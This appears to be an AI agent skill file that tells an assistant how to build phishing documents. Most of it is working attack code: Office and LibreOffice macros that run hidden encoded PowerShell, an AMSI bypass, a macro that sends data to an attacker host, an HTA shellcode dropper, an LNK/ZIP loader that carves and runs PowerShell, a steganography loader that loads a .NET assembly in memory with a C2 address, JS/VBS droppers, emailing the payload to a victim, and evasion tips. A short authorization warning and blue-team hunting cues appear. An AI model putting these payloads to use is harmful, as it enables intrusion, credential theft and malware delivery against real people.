---
name: phishing-documents
description: Create and analyze phishing documents for authorized security testing. Use this skill whenever the user needs to create malicious Office documents (Word, Excel, PowerPoint), HTA files, LNK loaders, or steganography-based payloads for penetration testing, red teaming, or security research. Trigger on requests about phishing campaigns, document-based attacks, macro payloads, HTA execution, NTLM authentication forcing, or any file-based social engineering techniques.
---

# Phishing Documents & Files

A comprehensive guide for creating and analyzing phishing documents in authorized security testing engagements.

## ⚠️ Authorization Required

**Only use these techniques in authorized security testing engagements.** Ensure you have written permission before creating or deploying any of these payloads.

## Quick Reference

| Technique | File Type | Best For |
|-----------|-----------|----------|
| Office Macros | `.doc`, `.docm`, `.xlsm` | Corporate environments with Office |
| LibreOffice Macros | `.odt` | Linux/Mac environments |
| HTA Files | `.hta` | Windows-only targets |
| LNK Loaders | `.lnk` + ZIP | Fileless execution chains |
| Steganography | Images with markers | Evasion-focused campaigns |
| JS/VBS Droppers | `.js`, `.vbs` | Initial access vectors |

---

## Office Documents

### Extension Selection Strategy

| Extension | Pros | Cons |
|-----------|------|------|
| `.doc` | Legacy format, less suspicious, macros work | Older format |
| `.docm` | Modern, clear macro support | Blocked by many gateways, shows warning icon |
| `.docx` | Most trusted | No macros (unless remote template) |
| `.rtf` (renamed from `.docm`) | Bypasses some filters | May not work on all systems |

**Recommendation:** Use `.doc` for best balance of compatibility and evasion.

### Checking Executable Extensions

```bash
# Windows: Check which extensions Office will execute
assoc | findstr /i "word excel powerp"

# Linux: Check file associations
file -i document.doc
```

### Macro Autoload Functions

| Function | Detection Risk | Notes |
|----------|----------------|-------|
| `AutoOpen()` | High | Most common, heavily monitored |
| `Document_Open()` | High | Common alternative |
| `AutoOpen` (no parens) | Medium | Less common variant |
| Custom event handlers | Low | More evasive |

### Macro Payload Patterns

#### Basic Shell Execution
```vba
Sub AutoOpen()
    Dim Shell As Object
    Set Shell = CreateObject("wscript.shell")
    Shell.Run "calc.exe"
End Sub
```

#### Encoded PowerShell (Evasion)
```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec (
        "powershell.exe -nop -Windowstyle hidden -ep bypass -enc " & _
        "BASE64_PAYLOAD_HERE"
    )
End Sub
```

#### AMSI Bypass Pattern
```vba
Sub AutoOpen()
    Dim code As String
    code = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    CreateObject("WScript.Shell").Exec "powershell.exe -nop -w hidden -ep bypass -enc " & code
End Sub
```

### Metadata Removal

**Always remove metadata before deployment:**

1. File → Info → Inspect Document
2. Click **Inspect**
3. Click **Remove All** next to **Document Properties and Personal Information**
4. Save as `.doc` (Word 97-2003 format)

### External Image Load (Data Exfiltration)

```vba
Sub Exfiltrate()
    Dim url As String
    url = "http://<attacker-ip>/collect?data=" & oWB.BuiltinDocumentProperties("Author")
    CreateObject("WinHttp.WinHttpRequest.5.1").Open "GET", url, False
    CreateObject("WinHttp.WinHttpRequest.5.1").Send
End Sub
```

---

## LibreOffice ODT Macros

### Basic Reverse Shell Macro

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD")
End Sub
```

**Important:** Use doubled quotes (`""`) to escape literal quotes in LibreOffice Basic.

### Setup Steps

1. Create ODT document in LibreOffice Writer
2. Tools → Customize → Events
3. Select **Open Document** event
4. Assign your macro
5. Save as `.odt`

### Email Delivery

```bash
# Using swaks - note the @ symbol for file attachment
swaks --to victim@example.com --attach @payload.odt --from sender@example.com
```

---

## HTA Files

### Basic HTA Structure

```html
<html>
  <head>
    <title>Document</title>
  </head>
  <body>
    <h2>Document Content</h2>
    
    <script language="VBScript">
      Function Execute()
        Set shell = CreateObject("wscript.Shell")
        shell.run "calc.exe", 0, False
      End Function

      Execute
    </script>
  </body>
</html>
```

### Shellcode Execution HTA

```html
<script language="VBScript">
  Function ExecuteShellcode()
    var_shellcode = "HEX_SHELLCODE_HERE"
    
    Dim var_obj, var_stream, var_tempdir, var_tempexe, var_basedir
    Set var_obj = CreateObject("Scripting.FileSystemObject")
    Set var_tempdir = var_obj.GetSpecialFolder(2)
    var_basedir = var_tempdir & "\" & var_obj.GetTempName()
    var_obj.CreateFolder(var_basedir)
    var_tempexe = var_basedir & "\" & "payload.exe"
    
    Set var_stream = var_obj.CreateTextFile(var_tempexe, true, false)
    For i = 1 to Len(var_shellcode) Step 2
        var_stream.Write Chr(CLng("&H" & Mid(var_shellcode, i, 2)))
    Next
    var_stream.Close
    
    Dim var_shell
    Set var_shell = CreateObject("Wscript.Shell")
    var_shell.run var_tempexe, 0, true
    
    var_obj.DeleteFile var_tempexe
    var_obj.DeleteFolder var_basedir
  End Function

  ExecuteShellcode
  self.close
</script>
```

**Note:** HTA execution requires `mshta.exe` which depends on Internet Explorer. Check target systems first.

---

## LNK Loaders + ZIP-Embedded Payloads

### Architecture

```
ZIP Archive
├── decoy.pdf (legitimate-looking)
├── decoy.docx (legitimate-looking)
├── payload.lnk (malicious)
└── [RAW DATA AFTER ZIP END]
    └── PowerShell payload (carved by LNK)
```

### PowerShell Carving Script

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop",
  "$env:USERPROFILE\Downloads",
  "$env:USERPROFILE\Documents",
  "$env:TEMP",
  "$env:ProgramData",
  (Get-Location).Path
)

$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | 
       Sort-Object LastWriteTime -Descending | Select-Object -First 1

if(-not $zip){ return }

$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)

if($idx -lt 0){ return }

$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Invoke-Expression $code
```

### LNK Creation

```bash
# Using lnk3gen (from linenum)
lnk3gen -t "./decoy.docx" -i "./payload.ps1" -w "./" -o "payload.lnk"
```

---

## Steganography-Delimited Payloads

### Workflow

1. **Stage 1:** JS/VBS dropper decodes Base64 → launches PowerShell
2. **Stage 2:** PowerShell downloads image, carves marker-delimited Base64
3. **Stage 3:** Loads .NET DLL in-memory, invokes entry method

### PowerShell Stego Extractor

```powershell
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)

$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)

if($start -lt 0 -or $end -lt 0 -or $end -le $start){ 
    throw 'markers not found' 
}

$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

### Creating Stego Image

```python
# scripts/create_stego_image.py
import base64
import sys

def create_stego_image(dll_path, output_path, start_marker='<<sudo_png>>', end_marker='<<sudo_odt>>'):
    with open(dll_path, 'rb') as f:
        dll_bytes = f.read()
    
    b64_payload = base64.b64encode(dll_bytes).decode('utf-8')
    stego_content = f"{start_marker}{b64_payload}{end_marker}"
    
    with open(output_path, 'w') as f:
        f.write(stego_content)
    
    print(f"Created stego image: {output_path}")
```

---

## JS/VBS Droppers

### JavaScript Dropper

```javascript
var WshShell = new ActiveXObject("WScript.Shell");
var encoded = "BASE64_POWERSHELL_PAYLOAD";
var decoded = decodeBase64(encoded);
WshShell.Run("powershell.exe -nop -w hidden -ep bypass -enc " + encoded, 0, false);

function decodeBase64(str) {
    return decodeURIComponent(escape(window.atob(str)));
}
```

### VBScript Dropper

```vbscript
Set objShell = CreateObject("WScript.Shell")
encoded = "BASE64_POWERSHELL_PAYLOAD"
objShell.Run "powershell.exe -nop -w hidden -ep bypass -enc " & encoded, 0, False
```

---

## NTLM Authentication Forcing

### Methods

| Method | Description | Risk |
|--------|-------------|------|
| Invisible images | Embed images from SMB share | Low |
| LNK files | Point to UNC path | Medium |
| HTML email | Link to SMB share | Low |
| Document properties | Reference remote template | Medium |

### Example: Remote Template

1. File → Options → Add-ins
2. Manage: Templates → Go
3. Add UNC path: `\\attacker\share\template.dotm`

---

## Detection & Evasion

### IOCs to Avoid

- Common macro function names (`AutoOpen`, `Document_Open`)
- Obvious PowerShell flags (`-enc`, `-nop`, `-w hidden`)
- Known marker strings (use custom markers)
- Standard AMSI bypass patterns

### Evasion Techniques

1. **String obfuscation:** Use hex encoding, Unicode, or custom encoding
2. **Marker variation:** Use unique, campaign-specific markers
3. **Timing delays:** Add random delays before execution
4. **Environment checks:** Verify target before executing
5. **Process injection:** Use process hollowing for final stage

### Hunting Cues (For Blue Team)

- ZIP files with ASCII markers appended after archive data
- `.lnk` files enumerating user folders
- PowerShell accessing images and decoding Base64
- `wscript.exe` spawning `powershell.exe` from temp paths
- AMSI tampering via `amsiInitFailed`

---

## References

- [MITRE ATT&CK T1027.003 - Steganography](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK T1055.012 - Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK T1127.001 - MSBuild Proxy Execution](https://attack.mitre.org/techniques/T1127/001/)
- [Check Point - ZipLine Campaign](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Unit 42 - PhantomVAI Loader](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)

---

## Helper Scripts

Use the bundled scripts for common tasks:

- `scripts/create_macro_doc.py` - Generate macro-enabled Word documents
- `scripts/create_hta.py` - Create HTA files with embedded payloads
- `scripts/create_stego_image.py` - Embed payloads in images
- `scripts/create_lnk_zip.py` - Create LNK loader with ZIP-embedded payload
- `scripts/encode_payload.py` - Encode payloads for various formats
